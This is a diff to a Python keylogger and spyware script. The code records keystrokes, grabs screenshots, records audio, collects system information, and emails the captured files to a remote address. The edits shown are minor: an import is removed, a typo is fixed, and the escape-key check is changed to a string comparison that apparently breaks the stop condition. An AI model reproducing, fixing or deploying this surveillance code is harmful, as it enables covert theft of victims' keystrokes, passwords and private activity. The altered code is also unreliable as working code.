@@ -20,8 +20,6 @@ import os
 from scipy.io.wavfile import write
 import sounddevice as sd
 
-from cryptography.fernet import Fernet
-
 from requests import get
 
 from PIL import ImageGrab
@@ -87,7 +85,7 @@ def send_email(attachments, toaddr):
     text = msg.as_string()
     s.sendmail(fromaddr, toaddr, text)
     s.quit()
-    print("its send!!")
+    print("its sent!!")
 
 
 # get the computer information
@@ -118,7 +116,7 @@ keys = []
 def keyloggs():
 
     def on_press(key):
-        global keys, count, currentTime
+        global keys, count
 
         # print(key)
         keys.append(key)
@@ -143,7 +141,7 @@ def keyloggs():
                     f.close()
 
     def on_release(key):
-        if key == Key.esc:
+        if key == "Key.esc":
             return False
 
     with Listener(on_press=on_press, on_release=on_release) as listener:
@@ -201,3 +199,5 @@ if __name__ == '__main__':
     send_email(all_files, toaddr)
     p.join()
     clear_logFile()
+
+
